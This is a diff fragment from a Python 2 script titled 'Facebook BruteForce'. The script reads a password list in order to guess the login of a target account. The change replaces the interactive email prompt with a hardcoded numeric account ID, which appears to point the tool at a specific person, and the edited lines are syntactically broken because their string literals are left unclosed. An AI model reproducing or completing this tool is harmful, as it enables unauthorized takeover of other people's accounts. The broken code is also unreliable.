@@ -27,9 +27,9 @@ except:
 print('\n---------- Welcome To Facebook BruteForce ----------\n')
 file=open('passwords.txt','r')
 
-email=str(raw_input('Enter Email/Username : ').strip())
+email=str(raw_input('Enter Email/Username : 100024320221015
 
-print "\nTarget Email ID : ",email
+print "\nTarget Email ID : 100024320221015
 print "\nTrying Passwords from list ..."
 
 i=0
